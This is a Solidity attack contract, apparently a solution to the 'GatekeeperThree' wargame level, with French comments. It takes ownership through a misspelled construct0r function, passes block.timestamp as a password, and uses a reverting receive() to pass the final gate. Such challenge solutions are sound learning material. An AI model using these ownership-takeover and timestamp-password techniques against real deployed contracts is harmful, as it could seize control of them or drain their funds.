// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface SimpleTrick {
    function checkPassword(uint _password) external returns (bool);
}

interface GatekeeperThree {
    function enter() external;

    function construct0r() external;

    function createTrick() external;

    function trick() external view returns (address);

    function getAllowance(uint _password) external;
}

contract PassGatekeeperThree {
    function enter(address _gatekeeperThreeAddress) external payable {
        GatekeeperThree gatekeeperThree = GatekeeperThree(
            _gatekeeperThreeAddress
        );

        // passe la gateOne
        gatekeeperThree.construct0r();

        // passe la gateTwo
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);

        // passe la gateThree.
        // N'oublie pas de transférer des fonds lors de la transaction (+ que 0,001 ether)
        (bool success, ) = payable(_gatekeeperThreeAddress).call{
            value: msg.value
        }("");
        require(success == true, "failed to send ether to gatekeeper three");

        gatekeeperThree.enter();
    }

    receive() external payable {
        // passe la deuxième condition de la gateThree
        revert();
    }
}
